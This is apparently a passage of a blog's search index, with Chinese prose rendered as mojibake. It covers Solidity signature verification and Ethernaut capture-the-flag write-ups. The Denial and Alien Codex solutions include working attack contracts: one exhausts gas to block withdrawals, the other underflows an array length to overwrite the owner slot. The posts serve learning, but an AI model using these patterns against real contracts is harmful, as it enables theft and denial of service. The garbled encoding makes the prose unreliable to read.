verify éªŒè¯ç­¾åå‡½æ•° function verify(address _signer, string memory _message, bytes memory _sig) external pure returns(bool) &#123; bytes32 messageHash = getMessageHash(_message); // å¯¹è¾“å…¥çš„æ¶ˆæ¯è¿›è¡Œ hashè¿ç®— bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash); // å¯¹è¾“å…¥æ¶ˆæ¯è¿›è¡ŒäºŒæ¬¡hash return recover(ethSignedMessageHash, _sig) == _signer; // åˆ¤æ–­å…¬é’¥çš„åœ°å€æ˜¯å¦ä¸_signer ç›¸ç­‰? &#125; function getMessageHash(string memory _message) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked(_message)); // å¯¹æ¶ˆæ¯è¿›è¡Œhashè¿ç®— &#125; function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; //åœ¨æ¶ˆæ¯ä¸­åŠ å…¥ &quot;\\x19Ethereum Signed Message:\\n32&quot; å­—ç¬¦ä¸²,å°†è¯¥å­—ç¬¦ä¸²å’Œ _messageHash æ‰“åŒ…å¹¶è¿›è¡Œhashè¿ç®— return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); &#125; function recover(bytes32 _ethSignedMessageHash, bytes memory _sig) public pure returns(address) &#123; (bytes32 r, bytes32 s, uint8 v) = _split(_sig); // å°†_sig åˆ†å‰²ä¸º r, s, vä¸‰ä¸ªéƒ¨åˆ† return ecrecover(_ethSignedMessageHash, v, r, s); &#125; function _split(bytes memory _sig) internal pure returns(bytes32 r, bytes32 s, uint8 v) &#123; require(_sig.length == 65, &quot;invalud signature length&quot;); assembly &#123; // add(_sig, 32) æŒ‡è·³è¿‡32ä½é•¿åº¦, å»è·å–_sig ä¸­çš„ä¸€ä¸ª32ä½æ•°æ® r := mload(add(_sig, 32)) // add(_sig, 64) æŒ‡è·³è¿‡64ä½é•¿åº¦, å»è·å–_sig ä¸­çš„ä¸€ä¸ª32ä½æ•°æ® s := mload(add(_sig, 64)) // add(_sig, 96) æŒ‡è·³è¿‡96ä½é•¿åº¦, å»è·å–_sig ä¸­çš„ä¸€ä¸ª32ä½æ•°æ® // byte(0, mload(add(_sig, 96))) è¿”å›32ä½ä¸­çš„ç¬¬ä¸€ä¸ªå€¼ v := byte(0, mload(add(_sig, 96))) &#125; &#125;&#125; 2. å¿ƒå¾—å‚æ‚Ÿï¼š2.1 ecrecover()å‡½æ•°ï¼Œä½œç”¨ï¼šåœ¨solidityä¸­æ˜¯ï¼Œå°†ç­¾åçš„å…¬é’¥è¿”å›ã€‚å³ï¼Œå‡å¦‚æˆ‘ä½¿ç”¨æˆ‘çš„ğŸ¦Šè´¦æˆ·ç»™æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œå¾—åˆ°ä¸€ä¸ªç­¾åï¼›åœ¨ecrecover() å‡½æ•°ä¸­ä¼ å…¥ ä»¥å¤ªåŠç­¾åæ¶ˆæ¯ï¼ˆå¯¹æ¶ˆæ¯è¿›è¡ŒäºŒæ¬¡ hashè¿ç®—çš„ç»“æœï¼‰ ï¼Œå’Œç­¾åçš„ç»„æˆéƒ¨åˆ† r , s, vï¼Œæœ€ç»ˆè¿”å›çš„ç»“æœä¸º æˆ‘ğŸ¦Šé’±åŒ…çš„è´¦æˆ·åœ°å€ï¼ˆå…¬é’¥ï¼‰ æ¦‚æ‹¬ï¼šecrecover()å‡½æ•°é€šè¿‡ä¼ å…¥çš„â€ä»¥å¤ªåŠç­¾åæ¶ˆæ¯â€ å’Œ â€œç­¾åçš„ï¼ˆr s vï¼‰ç»„æˆéƒ¨åˆ†â€ è¿”å›å…¬é’¥ï¼ˆğŸ¦Šé’±åŒ…è´¦æˆ·åœ°å€çš„å‰èº«ï¼‰2.2 è®¡ç®—ä»¥å¤ªåŠç­¾åæ¶ˆæ¯ï¼š æ¶ˆæ¯å¯ä»¥æ˜¯èƒ½è¢«æ‰§è¡Œçš„äº¤æ˜“ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä»»ä½•å½¢å¼ã€‚ä¸ºäº†é¿å…ç”¨æˆ·è¯¯ç­¾äº†æ¶æ„äº¤æ˜“ï¼ŒEIP191æå€¡åœ¨æ¶ˆæ¯å‰åŠ ä¸Š&quot;\\x19Ethereum Signed Message:\\n32&quot;å­—ç¬¦ï¼Œå¹¶å†åšä¸€æ¬¡keccak256å“ˆå¸Œï¼Œä½œä¸ºä»¥å¤ªåŠç­¾åæ¶ˆæ¯ã€‚ç»è¿‡toEthSignedMessageHash()å‡½æ•°å¤„ç†åçš„æ¶ˆæ¯ï¼Œä¸èƒ½è¢«ç”¨äºæ‰§è¡Œäº¤æ˜“:12345function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); //åœ¨æ¶ˆæ¯ä¸­åŠ å…¥ &quot;\\x19Ethereum Signed Message:\\n32&quot; å­—ç¬¦ä¸²,å°†è¯¥å­—ç¬¦ä¸²å’Œ_messageHash æ‰“åŒ…å¹¶è¿›è¡Œhashè¿ç®— &#125; 3. æ•°å­—ç­¾åçš„ç›¸å…³çŸ¥è¯†é“¾æ¥","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"éªŒè¯ç­¾å","slug":"éªŒè¯ç­¾å","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]},{"title":"Denial","slug":"Smart contracts/ethernaut/Denial","date":"2023-01-19T07:10:10.000Z","updated":"2023-01-19T07:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/Denial/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Denial/","excerpt":"","text":"Denial1. é¢˜ç›®è¦æ±‚ 1.1 è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é’±åŒ…ï¼Œä¼šéšç€æ—¶é—´çš„æ¨ç§»è€Œæµå¤±èµ„é‡‘ã€‚æ‚¨å¯ä»¥æˆä¸ºææ¬¾ä¼™ä¼´ï¼Œæ…¢æ…¢ææ¬¾ã€‚ é€šå…³æ¡ä»¶ï¼š åœ¨ownerè°ƒç”¨withdraw()æ—¶æ‹’ç»æå–èµ„é‡‘ï¼ˆåˆçº¦ä»æœ‰èµ„é‡‘ï¼Œå¹¶ä¸”äº¤æ˜“çš„gaså°‘äº1Mï¼‰ 1.2 é¢˜ç›®è¦æ±‚ // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance / 100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call&#123;value:amountToSend&#125;(&quot;&quot;); payable(owner).transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = block.timestamp; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds receive() external payable &#123;&#125; // convenience function function contractBalance() public view returns (uint) &#123; return address(this).balance; &#125; &#125; 12345678910111213141516171819## 2. åˆ†æ#### tipsï¼š [å‚è€ƒåšå®¢](https://stermi.medium.com/the-ethernaut-challenge-19-solution-denial-e498e19e9b4d)- 2.1è¿™ä¸ªå‡½æ•°åšäº†ä»€ä¹ˆï¼š - è®¾ç½®åˆçº¦çš„ä½™é¢`amountToSend` - `partner`é€šè¿‡ä½çº§åˆ«å°†ä½™é¢çš„ 1% è½¬ç§»åˆ°`call` - å°†ä½™é¢çš„ 1% è½¬å…¥åˆçº¦çš„`owner`via`transfer` - `withdraw`æ›´æ–°å‡½æ•°æœ€åä¸€æ¬¡æ‰§è¡Œçš„æ—¶é—´ - æ›´æ–°åˆä½œä¼™ä¼´æå–çš„é‡‘é¢ æ­£å¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œè¿™ä¸ªæŒ‘æˆ˜å®Œå…¨æ˜¯å…³äºæ‹’ç»æœåŠ¡ (DOS) çš„æ¦‚å¿µï¼Œè¿™æ˜¯ä¸€ä¸ªé€šç”¨æœ¯è¯­ï¼Œç”¨äºæè¿°å¤–éƒ¨å‚ä¸è€…æ‹’ç»æœåŠ¡çš„æŸä¸ªæ–¹é¢çš„æƒ…å†µã€‚åœ¨è¿™ç§ç‰¹å®šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦å¦è®¤`withdraw`åˆçº¦çš„è¿‡ç¨‹ã€‚ æˆ‘ä»¬è¯¥æ€ä¹ˆåšï¼Ÿ`call`æˆ‘ä»¬å”¯ä¸€çš„é€‰æ‹©æ˜¯åœ¨å¤–éƒ¨å¯¹åœ°å€åšä¸€äº›åäº‹`partner`ã€‚è®©æˆ‘ä»¬çœ‹çœ‹åº•å±‚`call`åœ¨ Solidity ä¸­æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ (bool success, bytes memory data) = targetAddress.call&#123;value: &lt;weiSent&gt;, gas: &lt;gasForwarded&gt;&#125;(&lt;calldata&gt;); 1234567891011121314151617181920212223242526272829303132333435363738394041 æ­£å¦‚æˆ‘æåˆ°çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå…è®¸æ‚¨åšå¾ˆå¤šäº‹æƒ…çš„ä½çº§å‡½æ•°ã€‚é€šå¸¸ï¼Œå®ƒç”¨äºï¼š - `value`é€šè¿‡åœ¨é€‰é¡¹ä¸­æŒ‡å®š wei çš„æ•°é‡å°† Ether å‘é€åˆ° EAO - é€šè¿‡åœ¨é€‰é¡¹ä¸­æŒ‡å®š wei çš„æ•°é‡ï¼Œå°† Ether å‘é€åˆ°å·²å®ç°`receive`orå‡½æ•°çš„åˆçº¦`fallback``value` - é€šè¿‡å°†å“ªä¸ªå‡½æ•°å’Œå“ªäº›å‚æ•°ä¼ é€’ç»™ç›®æ ‡å‡½æ•°æ¥è°ƒç”¨åˆçº¦å‡½æ•°`&lt;calldata&gt;`ã€‚ä¾‹å¦‚ï¼Œ`abi.encodeWithSignature(&quot;callMePlease()&quot;)` è™½ç„¶è¿™ä¸¤ä¸ª`transfer`é«˜çº§`send`å‡½æ•°ï¼ˆç”¨äºå°† ETH å‘é€åˆ°ç›®æ ‡åœ°å€ï¼‰éƒ½ä½¿ç”¨**2300 gas**çš„ç¡¬ç¼–ç é‡æ¥æ‰§è¡Œæ“ä½œï¼Œä½†è¯¥`call`å‡½æ•°æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼š - é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ‚¨ä¸æŒ‡å®šä»»ä½•å†…å®¹ï¼Œå®ƒå°†è½¬å‘**æ‰€æœ‰å‰©ä½™çš„äº¤æ˜“æ°”ä½“** - `gas`å¦åˆ™ï¼Œæ‚¨å¯ä»¥æŒ‡å®šå¤–éƒ¨åˆçº¦å¯ä»¥ä½¿ç”¨å‚æ•°çš„æ°”ä½“é‡ è¯¥`call`å‡½æ•°å°†è¿”å›ä¸¤ä¸ªå‚æ•°ï¼š - `bool success`å¦‚æœè°ƒç”¨æˆåŠŸ - `bytes memory data`è¿”å›å€¼ æ¯æ¬¡ä½ æ‰§è¡Œä¸€ä¸ª`call`ä½ åº”è¯¥**æ€»æ˜¯**æ£€æŸ¥å®ƒæ˜¯å¦å·²ç»æˆåŠŸå¹¶æ¢å¤ï¼ˆæˆ–å¤„ç†å®ƒä½†æ˜¯ä½ çš„åœºæ™¯éœ€è¦ï¼‰å¦‚æœ`success`å€¼ä¸ºå‡ã€‚æœ‰å…³æ­¤æ–¹é¢çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[SWC-104ï¼šæœªç»æ£€æŸ¥çš„è°ƒç”¨è¿”å›å€¼ã€‚](https://swcregistry.io/docs/SWC-104) æ— è®ºå¦‚ä½•ï¼Œå›åˆ°æˆ‘ä»¬çš„åœºæ™¯ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥åœ¨`Denial` `withdraw`å‡½æ•°å‘æˆ‘ä»¬å‘é€`partner`èµ„é‡‘æ—¶å¯¹å…¶è¿›è¡Œ DoSã€‚ å› ä¸ºå‡½æ•°æ²¡æœ‰æ£€æŸ¥è¿”å›å€¼ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªå·¨å¤§çš„é”™è¯¯ï¼Œè¯·å‚é˜… SWC-104 é—®é¢˜ï¼‰**å³ä½¿æˆ‘ä»¬**åœ¨è°ƒç”¨æ‰§è¡Œä¸­æ¢å¤`withdraw`ï¼Œå‡½æ•°çš„æµç¨‹ä¹Ÿä¼šç»§ç»­ã€‚æˆ‘ä»¬å¦‚ä½•å¼ºåˆ¶åœæ­¢æ‰§è¡Œï¼Ÿ æˆ‘ä»¬å”¯ä¸€çš„é€‰æ‹©æ˜¯**æ’å‡ºæ‰€æœ‰è½¬å‘çš„æ°”ä½“**ï¼Œå¹¶ç”±äºâ€œæ°”ä½“ä¸è¶³â€å¼‚å¸¸è€Œä½¿æ™ºèƒ½åˆçº¦æ¢å¤ã€‚ ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ— é™å¾ªç¯å¯¹çŠ¶æ€å˜é‡æ‰§è¡Œè®¡æ•°å™¨å¢åŠ - [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=Lx0L_3RuJ8c) å†™çš„æ”»å‡»åˆçº¦ï¼š- ```solidity contract Hack &#123; constructor(Denial target) &#123; target.setWithdrawPartner(address(this)); &#125; fallback() external payable &#123; assembly &#123; invalid() &#125; &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0xa22A605788d9828cb51eAd6AA5d5549cb40Da5F0 3.2 å°†å®åŠ›åœ°å€ä½œä¸ºå‚æ•°ï¼Œç”¨ä»¥éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Alien Codex","slug":"Smart contracts/ethernaut/Alien Codex","date":"2023-01-19T04:10:10.000Z","updated":"2023-01-19T04:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/Alien Codex/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/","excerpt":"","text":"Alien Codex1. é¢˜ç›®è¦æ±‚ 1.1 ä½ æ‰“å¼€äº†ä¸€ä¸ª Alien åˆçº¦. ç”³æ˜æ‰€æœ‰æƒæ¥å®Œæˆè¿™ä¸€å…³. è¿™å¯èƒ½æœ‰å¸®åŠ© ç†è§£Array Storageæ˜¯æ€ä¹ˆå›äº‹ ç†è§£ ABI specifications ä½¿ç”¨ä¸€ä¸ªéå¸¸ ç‹— æ–¹æ³• 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import &#39;../helpers/Ownable-05.sol&#39;; contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact() public &#123; contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445## 2. åˆ†æ#### tips: [å‚è€ƒåšå®¢](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1 åœ¨ AlienCodex åˆçº¦ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥`retract()`å‡½æ•°å¯¼è‡´æ•°ç»„é•¿åº¦å‡ºç°æ•´æ•°ä¸‹æº¢`codex`ã€‚è¿™ä¸ªä¸‹æº¢å…è®¸æˆ‘ä»¬é€šè¿‡å‡½æ•°ä¿®æ”¹åˆçº¦ä¸­çš„ä»»ä½•çŠ¶æ€å˜é‡`revise()`ã€‚è¯¥æ¼æ´å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼æ‰§è¡Œï¼š 1. è°ƒç”¨`make_contact()`å‡½æ•°é€šè¿‡`contacted()`ä¿®é¥°ç¬¦æ£€æŸ¥ï¼Œè¦æ±‚`contact`ä¸ºçœŸã€‚ 2. è°ƒç”¨`retract()`å‡½æ•°å¯¼è‡´æ•°ç»„`codex`é•¿åº¦æ•´æ•°æº¢å‡º 3. é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰¾åˆ°çŠ¶æ€å˜é‡çš„æ•£åˆ—ï¼Œ`owner`å°±å¥½åƒå®ƒæ˜¯`codex`æ•°ç»„çš„ä¸€éƒ¨åˆ†ä¸€æ ·ï¼š - è·å–æ•°ç»„ä¸­ç¬¬ä¸€é¡¹çš„å“ˆå¸Œå€¼`codex`ï¼ˆå› ä¸ºå®ƒåœ¨åˆçº¦å­˜å‚¨ä¸­è¢«ç´¢å¼•ï¼‰ï¼Œå¯¹åº”äºå®ƒåœ¨åˆçº¦å­˜å‚¨ä¸­çš„æ§½ä½ã€‚è¿™å¯ä»¥é€šè¿‡è®¡ç®—ç¬¬ä¸€ä¸ª*ä½ç½®*çš„ Keccak256 å“ˆå¸Œå€¼æ¥è·å¾—ï¼Œå› æ­¤ï¼š`keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)`ã€‚ - å–ç”±æ­¤ ( `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`) äº§ç”Ÿçš„å“ˆå¸Œå€¼ï¼Œå¹¶ä»åˆçº¦ä¸­çš„æœ€å¤§æ’æ§½æ•°é‡ä¸­å‡å»å…¶æ•´æ•°å€¼åŠ ä¸€ (2ä¸ª256âˆ’1ä¸ª), å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š - ![image-20230225150415772](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020020955.png)d.ä½¿ç”¨è¿™ä¸ªç»“æœå€¼ä½œä¸º`revise()`è¦ä¿®æ”¹çš„`i`æ•°ç»„çš„ï¼ˆç´¢å¼•)å’Œæˆ‘ä»¬çš„åœ°å€ã€‚`codex``_content`- 2.2 [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=2onc3F6Lbg0) å†™çš„æ”»å‡»åˆçº¦- ```solidity interface IAlienCodex &#123; function owner() external view returns (address); function make_contact() external; function revise(uint i, bytes32 _content) external; function retract() external; &#125; contract Hack &#123; constructor(IAlienCodex target) &#123; target.make_contact(); target.retract(); uint256 h = uint256(keccak256(abi.encode(uint256(1)))); uint256 i = uint256(0) - h; // unchecked &#123; // i = i - h; // &#125; target.revise(i, bytes32(uint256(uint160(msg.sender)))); require(target.owner() == msg.sender, &quot;Hack Failed&quot;); &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x175A96bA1755F20E85ff80089ec9000dD0df463e 3.2 å°†å®ä¾‹åœ°å€ä½œä¸ºå‚æ•°è¿›è¡Œå¯¹æ”»å‡»åˆçº¦çš„éƒ¨ç½² 3.3 æäº¤æ¡ˆä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"MagicNumber","slug":"Smart contracts/ethernaut/MagicNumber","date":"2023-01-19T01:10:10.000Z","updated":"2023-01-19T01:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/MagicNumber/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/MagicNumber/","excerpt":"","text":"MagicNumber1. é¢˜ç›®è¦æ±‚ 1.1 To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. Easy right? Wellâ€¦ thereâ€™s a catch. The solverâ€™s code needs to be really tiny. Really reaaaaaallly tiny. Like freakinâ€™ really really itty-bitty tiny: 10 opcodes at most. Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. Thatâ€™s right: Raw EVM bytecode. Good luck 1.2 è¯‘ï¼šè¦è§£å†³è¿™ä¸ªå…³å¡ï¼Œä½ åªéœ€è¦å‘ Ethernaut æä¾›ä¸€ä¸ªï¼Œä¸€ä¸ªç”¨æ­£ç¡®çš„æ•°å­—Solverå“åº”çš„åˆçº¦ã€‚whatIsTheMeaningOfLife() ç®€å•å§ï¼Ÿå—¯â€¦æœ‰ä¸€ä¸ªé—®é¢˜ã€‚ æ±‚è§£å™¨çš„ä»£ç éœ€è¦éå¸¸å°ã€‚çœŸçš„å¾ˆå°ã€‚å°±åƒ freakinâ€™ really really itty-bitty tinyï¼šæœ€å¤š 10 ä¸ªæ“ä½œç ã€‚ æç¤ºï¼šä¹Ÿè®¸æ˜¯æ—¶å€™æš‚æ—¶ç¦»å¼€ Solidity ç¼–è¯‘å™¨çš„èˆ’é€‚ç¯å¢ƒï¼Œå¹¶æ‰‹åŠ¨æ„å»ºè¿™ä¸ª O_oã€‚æ²¡é”™ï¼šåŸå§‹ EVM å­—èŠ‚ç ã€‚ ç¥ä½ å¥½è¿ï¼ 1.3 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract MagicNum &#123; address public solver; constructor() &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ &#125; 123456789101112131415161718192021222324252627282930313233- ## 2. åˆ†æ#### tipsï¼š [å‚è€ƒåšå®¢](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)- 2.1æœ‰ä¸€ä¸ªåœ¨è°ƒç”¨æ—¶`whatIsTheMeaningOfLife`åº”ç­”`0x000000000000000000000000000000000000000000000000000000000000002a`(bytes32) çš„å‡½æ•°ã€‚è¿™æ˜¯åè¿›åˆ¶çš„ 42 çš„åå…­è¿›åˆ¶è½¬æ¢ã€‚2ï¼‰æˆ‘ä»¬çš„åˆçº¦ä»£ç å¿…é¡»å°äº10å­—èŠ‚ è¿™äº›è¦æ±‚ä¼¼ä¹æ— æ³•å®ç°ï¼Œå³ä½¿ä½¿ç”¨åŸå§‹å­—èŠ‚ç æ¥å®šä¹‰å‡½æ•°ã€å¤„ç†å‡½æ•°é€‰æ‹©å™¨ç­‰ï¼Œä¹Ÿå°†è¿œè¿œè¶…è¿‡ 10 å­—èŠ‚çš„ä»£ç ã€‚ ä½†æ˜¯æˆ‘ä»¬çœŸçš„éœ€è¦æœ‰é‚£ä¸ªåŠŸèƒ½å—ï¼Ÿæœ€åï¼Œæˆ‘ä»¬å¿…é¡»å¡‘é€ åˆçº¦ä»£ç æ‰èƒ½é€šè¿‡æŒ‘æˆ˜ã€‚å¦‚æœæˆ‘ä»¬çš„åˆåŒï¼Œæ— è®ºå®ƒå¦‚ä½•æ‰§è¡Œï¼Œ**åª**è¿”å›**42**æ€ä¹ˆåŠï¼Ÿ è¿™å°±æ˜¯è¯€çªï¼å¦‚æœä½ è®¤ä¸ºå®ƒå°±åƒæ‹¥æœ‰ä¸€ä¸ª Solidity æ™ºèƒ½åˆçº¦è€Œä¸æ˜¯åªæœ‰ä¸€ä¸ª`fallback`å‡½æ•°ï¼Œé‚£ä¹ˆæ— è®ºä½ å°è¯•ä½çº§è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼Œå®ƒéƒ½å°†å§‹ç»ˆä¸”åªæ‰§è¡Œè¯¥`fallback`å‡½æ•°ã€‚- 2.2 ç°åœ¨æˆ‘ä»¬éœ€è¦éƒ¨ç½²æˆ‘ä»¬åˆšåˆšåœ¨ä¸Šä¸€èŠ‚ä¸­ç¼–å†™çš„æœ€å°åˆçº¦ã€‚å½“ä¸€ä¸ªæ™ºèƒ½åˆçº¦è¢«åˆ›å»ºæ—¶ï¼ˆvia `CREATE`or `CREATE2`opcodeï¼‰ï¼ŒEVM ä¼šæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ä»£ç ï¼Œå¹¶ä¸”éƒ¨ç½²çš„æ™ºèƒ½åˆçº¦çš„ä»£ç ä¼šè¢« opcode è¿”å›`RETURN`ï¼ˆè¿™ä¸ªè¿”å›çš„ä»£ç ç§°ä¸ºè¿è¡Œæ—¶ä»£ç ï¼Œå®ƒæ˜¯å°†è¦æ‰§è¡Œçš„ä»£ç å½“æ‚¨ä¸æ™ºèƒ½åˆçº¦äº¤äº’æ—¶ï¼‰- [å‚è€ƒè§†é¢‘](https://www.youtube.com/watch?v=gUVS4EcrQQQ) å†™çš„æ”»å‡»åˆçº¦ï¼š- ```solidity contract Hack &#123; constructor(MagicNum target) &#123; bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;; address addr; assembly &#123; addr := create(0, add(bytecode, 0x20), 0x13) &#125; require(addr != address(0)); target.setSolver(addr); &#125; &#125; 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š0x5072f4af6D9B0907833C43b199000347158f685d 3.2 ä¼ å…¥å®ä¾‹åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ 3.3 æäº¤å®ä¾‹ 3.4 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Recovery","slug":"Smart contracts/ethernaut/Recovery","date":"2023-01-18T11:10:10.000Z","updated":"2023-01-18T11:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Recovery/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/","excerpt":"","text":"Recovery1. é¢˜ç›®è¦æ±‚ 1.1 åˆçº¦åˆ›å»ºè€…æ„å»ºäº†ä¸€ä¸ªéå¸¸ç®€å•çš„ä»£å¸å·¥å‚åˆçº¦ã€‚ ä»»ä½•äººéƒ½å¯ä»¥è½»æ¾åˆ›å»ºæ–°ä»£å¸ã€‚ åœ¨éƒ¨ç½²äº†ä¸€ä¸ªä»£å¸åˆçº¦åï¼Œåˆ›å»ºè€…å‘é€äº† 0.001 ä»¥å¤ªå¸ä»¥è·å¾—æ›´å¤šä»£å¸ã€‚ åè¾¹ä»–ä»¬ä¸¢å¤±äº†åˆçº¦åœ°å€ã€‚ å¦‚æœæ‚¨èƒ½ä»ä¸¢å¤±çš„çš„åˆçº¦åœ°å€ä¸­æ‰¾å›(æˆ–ç§»é™¤)ï¼Œåˆ™é¡ºåˆ©é€šè¿‡æ­¤å…³ã€‚ 1.2 é¢˜ç›®ä»£ç  // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Recovery &#123; //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125; &#125; contract SimpleToken &#123; string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 _initialSupply) &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens receive() external payable &#123; balances[msg.sender] = msg.value * 10; &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender] - _amount; balances[_to] = _amount; 